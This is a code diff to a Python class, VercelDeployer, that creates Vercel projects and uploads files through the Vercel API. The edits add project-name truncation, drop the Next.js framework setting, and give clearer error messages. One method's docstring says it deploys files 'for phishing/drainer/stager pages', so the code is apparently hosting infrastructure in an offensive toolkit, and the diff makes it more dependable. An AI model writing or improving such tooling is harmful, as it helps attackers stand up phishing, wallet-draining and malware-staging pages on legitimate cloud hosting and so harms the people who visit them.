@@ -56,15 +56,19 @@ class VercelDeployer:
         """
         team_id = self._resolve_team()
         project_name = f"{self.project_base}-{suffix}"
+        # Vercel project names: max 100 chars, lowercase alphanumeric + hyphens
+        if len(project_name) > 52:
+            max_suffix = 52 - len(self.project_base) - 1
+            project_name = f"{self.project_base}-{suffix[:max_suffix]}"
+        project_name = project_name.rstrip("-").lower()[:52]
 
-        # 1. Create project
+        # 1. Create project (no framework — static deployment)
         resp = requests.post(
             f"{self.BASE}/projects",
             headers=self.headers,
             json={
                 "name": project_name,
                 "teamId": team_id,
-                "framework": "next",
             },
         )
         # If project name collision, append random suffix
@@ -73,9 +77,13 @@ class VercelDeployer:
             resp = requests.post(
                 f"{self.BASE}/projects",
                 headers=self.headers,
-                json={"name": project_name, "teamId": team_id, "framework": "next"},
+                json={"name": project_name, "teamId": team_id},
             )
-        resp.raise_for_status()
+        if not resp.ok:
+            raise RuntimeError(
+                f"Vercel API: failed to create project '{project_name}': "
+                f"{resp.status_code} {resp.text}"
+            )
         project = resp.json()
         project_id = project["id"]
 
@@ -126,6 +134,11 @@ class VercelDeployer:
         """Deploy arbitrary files to Vercel (for phishing/drainer/stager pages)."""
         team_id = self._resolve_team()
         project_name = f"{self.project_base}-{suffix}"
+        # Truncate to Vercel's 52-char limit
+        if len(project_name) > 52:
+            max_suffix = 52 - len(self.project_base) - 1
+            project_name = f"{self.project_base}-{suffix[:max_suffix]}"
+        project_name = project_name.rstrip("-").lower()[:52]
 
         # Create project
         resp = requests.post(
@@ -140,7 +153,11 @@ class VercelDeployer:
                 headers=self.headers,
                 json={"name": project_name, "teamId": team_id},
             )
-        resp.raise_for_status()
+        if not resp.ok:
+            raise RuntimeError(
+                f"Vercel API: failed to create project '{project_name}': "
+                f"{resp.status_code} {resp.text}"
+            )
         project_id = resp.json()["id"]
 
         # Build file list for deployment
